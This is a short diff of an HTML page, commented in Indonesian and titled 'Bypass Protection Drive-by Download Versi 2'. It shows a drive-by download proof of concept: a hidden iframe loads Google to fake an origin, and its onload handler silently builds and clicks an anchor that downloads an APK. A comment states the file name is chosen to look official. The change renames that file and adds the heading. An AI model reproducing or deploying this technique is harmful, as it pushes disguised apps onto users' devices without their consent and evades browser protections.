@@ -23,6 +23,7 @@
 }
 </style>
  </head>
+ <h3>Bypass Protection Drive-by Dowload Versi 2</h3>
  <body>
   <!-- Iframe tersembunyi untuk load Google, simulasi origin -->
   <iframe class="hidden-iframe" src="https://www.google.com" onload="simulateDownload()"></iframe>
@@ -45,7 +46,7 @@ function simulateDownload() {
       // Buat virtual anchor untuk download, tanpa buka tab baru
       const a = document.createElement('a');
       a.href = blobUrl;
-      a.download = 'poc.apk'; // Nama file palsu, biar kelihatan resmi
+      a.download = 'poc-01.apk'; // Nama file palsu, biar kelihatan resmi
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
